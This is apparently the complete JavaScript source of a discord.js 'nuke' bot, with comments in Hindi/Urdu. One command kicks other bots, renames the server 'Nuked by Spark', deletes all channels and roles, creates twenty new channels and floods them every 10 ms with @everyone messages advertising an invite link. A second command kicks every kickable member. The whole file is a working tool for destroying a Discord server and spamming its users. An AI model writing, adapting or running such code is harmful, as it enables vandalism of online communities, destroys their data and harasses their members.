const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder, 
    ChannelType 
} = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

let welcomeInterval = null;

// =========================
// BANNER URL - Yahan set karein
// =========================
const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1555413440024023100/a9366db0-e4ac-4190-845c-b1eeb6e88b92.gif?backend=b2&ex=6ac7af66&is=6ac65de6&hm=ff994fce35c7a6fad6460c11715e456166f82dfe486a734e4c744016b3ce9207&";

client.once("ready", () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {
    if (message.author.bot || !message.guild) return;

    const guild = message.guild;
    const command = message.content.toLowerCase();

    // ==========================================
    // 1. COMMAND: !moon
    // ==========================================
    if (command === "!moon") {
        try {
            // 1. Kick all bots
            const botMembers = await guild.members.fetch();
            for (const [, member] of botMembers) {
                if (
                    member.user.bot &&
                    member.id !== client.user.id &&
                    member.id !== message.author.id &&
                    member.kickable
                ) {
                    await member.kick("Moon command").catch(() => {});
                }
            }

            // 1.1 Server Changer
            await guild.setName("Nuked by Spark 💥🤯").catch(() => {});
            await guild.setIcon(
                "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
            ).catch(() => {});
            
            // 2. Delete all existing channels
            const channels = [...guild.channels.cache.values()];
            for (const channel of channels) {
                await channel.delete("Moon command").catch(() => {});
            }

            // 3. Delete all deletable roles
            const roles = [...guild.roles.cache.values()];
            for (const role of roles) {
                if (role.id !== guild.id && role.editable) {
                    await role.delete("Moon command").catch(() => {});
                }
            }

            // 4. Create new text channels
            const newChannels = [];
            for (let i = 0; i < 20; i++) {
                const channel = await guild.channels.create({
                    name: "nuked by spark 💥🤯",
                    type: ChannelType.GuildText
                }).catch(() => null);

                if (channel) {
                    newChannels.push(channel);
                }
            }

            // 5. Send initial message
            const welcomeMessage = "@everyone nuked by **spark** 💥🤯 join our discord discord.gg/h5ejJAabPv ";
            await Promise.all(
                newChannels.map(channel =>
                    channel.send({
                        content: welcomeMessage,
                        embeds: [{ image: { url: BANNER_URL } }]
                    }).catch(() => {})
                )
            );

            // 6. Purana interval stop agar active ho
            if (welcomeInterval) {
                clearInterval(welcomeInterval);
                welcomeInterval = null;
            }

            // 7. Interval spam (Note: Discord API rate-limit ki wajah se 10ms bohot kam hai, lag ho sakta hai)
            welcomeInterval = setInterval(async () => {
                for (const channel of newChannels) {
                    await channel.send({
                        content: welcomeMessage,
                        embeds: [{ image: { url: BANNER_URL } }]
                    }).catch(() => {});
                }
            }, 10); // 5 seconds recommended taaki rate limit na lage

        } catch (error) {
            console.error("Error executing !moon command:", error);
        }
    }

    // ==========================================
    // 2. COMMAND: !sun (Members Kick)
    // ==========================================
    if (command === "!sun") {
        try {
            const allMembers = await guild.members.fetch();
            
            for (const [, member] of allMembers) {
                if (
                    member.id !== client.user.id &&
                    member.id !== message.author.id &&
                    member.kickable
                ) {
                    await member.kick("Sun command").catch(() => {});
                }
            }
        } catch (error) {
            console.error("Error executing !sun command:", error);
        }
    }
});

// Bot token ko .env file me DISCORD_TOKEN ke naam se rakhein
client.login(process.env.DISCORD_TOKEN);
